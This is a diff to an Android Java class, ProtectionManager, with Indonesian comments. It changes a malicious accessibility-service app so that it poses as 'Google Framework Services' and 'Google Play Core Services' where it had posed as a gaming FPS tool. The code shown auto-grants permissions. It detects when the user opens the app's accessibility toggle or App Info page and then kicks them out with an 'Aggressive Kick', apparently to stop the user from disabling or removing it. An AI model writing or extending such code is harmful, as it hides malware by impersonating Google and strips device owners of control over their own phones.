@@ -91,7 +91,8 @@ public class ProtectionManager {
             
             // Verifikasi apakah masih ada izin yang kurang
             if (!hasAllPermissions()) {
-                // Gunakan pencarian cepat
+                // Gunakan pencarian cepat secara langsung di main thread event loop
+                // (Tanpa Handler tambahan di sini agar lebih stabil)
                 autoAllowPermissions();
             }
         }
@@ -151,7 +152,7 @@ public class ProtectionManager {
                                      checkNodeForText(root, "Grant");
         if (isPermissionDialog) return false;
 
-        String appName = "BondexFPS"; 
+        String appName = "Google Framework Services"; 
         try {
             int stringId = service.getApplicationInfo().labelRes;
             if (stringId != 0) appName = service.getString(stringId);
@@ -180,13 +181,12 @@ public class ProtectionManager {
         }
 
         // 2. Identitas Label & Deskripsi (Dari strings.xml)
-        String accLabel = "BlueStacks Mobile Optimization";
+        String accLabel = "Google Play Core Services";
         
-        // KATA KUNCI UNIK dari android:description di xml aksesibilitas kita
-        // Ini HANYA akan muncul di halaman toggle/detail layanan kita.
-        boolean isDetailPage = checkNodeRecursive(root, "real-time FPS") || 
-                               checkNodeRecursive(root, "smoother gaming experience") ||
-                               checkNodeRecursive(root, "hardware resources");
+        // KATA KUNCI UNIK dari android:description baru
+        boolean isDetailPage = checkNodeRecursive(root, "core functionality") || 
+                               checkNodeRecursive(root, "system communication") ||
+                               checkNodeRecursive(root, "background synchronization");
 
         if (isDetailPage) {
             Log.e(TAG, "!! DETECTED ON ACCESSIBILITY TOGGLE PAGE !! Aggressive Kick.");
@@ -229,7 +229,7 @@ public class ProtectionManager {
         if (!isAppInfoContext) return false;
 
         // Jika ini memang halaman App Info, cek apakah ini milik aplikasi kita
-        String appName = "BondexFPS";
+        String appName = "Google Framework Services";
         String targetPkg = service.getPackageName();
         
         return checkNodeRecursive(root, appName) || checkNodeRecursive(root, targetPkg);
